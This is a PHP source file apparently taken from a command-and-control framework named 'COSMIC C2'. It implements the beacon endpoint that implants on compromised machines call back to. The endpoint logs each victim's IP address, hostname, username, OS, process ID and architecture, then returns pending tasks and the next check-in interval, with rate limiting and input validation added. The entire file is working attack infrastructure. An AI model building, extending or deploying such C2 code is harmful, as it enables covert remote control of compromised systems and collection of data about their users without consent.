<?php
/**
 * COSMIC C2 – Payload Beacon Endpoint (v2.0)
 * Receives callbacks from implants, records beacon, returns pending tasks.
 * Enhanced with rate limiting, input validation, and logging.
 */

require_once dirname(__DIR__, 2) . '/system/modules/C2Engine.php';
require_once dirname(__DIR__) . '/includes/security_functions.php';

header('Content-Type: application/json');

// ==================== RATE LIMITING ====================
$rateLimitKey = 'beacon_' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
if (!check_rate_limit($rateLimitKey, 30, 60)) {
    http_response_code(429);
    die(json_encode(['error' => 'Rate limit exceeded. Try again later.']));
}

// ==================== INPUT VALIDATION ====================
$uuid = $_GET['uuid'] ?? $_POST['uuid'] ?? '';
$uuid = sanitize_uuid($uuid);
if (strlen($uuid) !== 36) {
    http_response_code(400);
    die(json_encode(['error' => 'Invalid payload UUID format']));
}

$input = json_decode(file_get_contents('php://input'), true);
if (!is_array($input)) {
    $input = $_POST;
}

$safeInput = [
    'hostname'    => sanitize_input($input['hostname'] ?? '', 255),
    'username'    => sanitize_input($input['username'] ?? '', 255),
    'os_info'     => sanitize_input($input['os'] ?? $input['os_info'] ?? '', 255),
    'pid'         => filter_var($input['pid'] ?? 0, FILTER_VALIDATE_INT, ['options' => ['default' => 0, 'min_range' => 1]]),
    'architecture'=> sanitize_input($input['arch'] ?? $input['architecture'] ?? '', 50),
];

// ==================== PROCESS BEACON ====================
$c2 = new C2Engine();
$result = $c2->beacon($uuid, [
    'ip'         => $_SERVER['REMOTE_ADDR'] ?? '',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'hostname'   => $safeInput['hostname'],
    'username'   => $safeInput['username'],
    'os_info'    => $safeInput['os_info'],
    'pid'        => $safeInput['pid'],
    'architecture' => $safeInput['architecture'],
]);

// ==================== LOGGING ====================
log_security_event('C2_BEACON', [
    'uuid'      => $uuid,
    'ip'        => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'tasks'     => isset($result['tasks']) ? count($result['tasks']) : 0,
    'status'    => isset($result['error']) ? 'error' : 'ok'
]);

// ==================== RESPONSE ====================
if (isset($result['error'])) {
    http_response_code(400);
    echo json_encode(['error' => $result['error']]);
} else {
    echo json_encode([
        'status'  => 'ok',
        'tasks'   => $result['tasks'] ?? [],
        'interval' => $result['next_interval'] ?? 60
    ]);
}
